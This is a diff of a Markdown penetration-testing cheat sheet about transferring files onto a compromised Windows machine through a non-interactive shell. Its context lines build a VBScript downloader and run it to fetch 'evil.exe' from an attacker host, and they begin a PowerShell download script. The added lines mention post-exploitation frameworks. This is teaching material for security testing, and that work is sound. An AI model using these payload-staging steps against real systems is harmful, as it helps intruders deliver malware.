@@ -87,7 +87,7 @@ echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+ echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
 echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
 echo Err.Clear >> wget.vbs
 echo Set http = Nothing >> wget.vbs
@@ -118,6 +118,10 @@ cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
 ## PowerShell
 
 This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:
+
+
+
+Powersploit nisang \(Post exploitation frameworks\)
 
 ```
 echo $storageDir = $pwd > wget.ps1
